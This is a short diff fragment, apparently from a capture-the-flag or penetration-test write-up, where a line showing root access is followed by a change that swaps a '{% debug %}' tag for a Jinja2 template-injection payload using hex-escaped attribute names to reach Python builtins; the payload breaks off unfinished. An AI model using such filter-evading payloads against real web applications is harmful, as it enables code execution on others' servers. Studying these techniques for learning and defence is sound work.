@@ -245,5 +245,5 @@ uid=0(root) gid=0(root) groups=0(root)
 We are root.
 
 ```
-{% debug %}
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr(
 ```
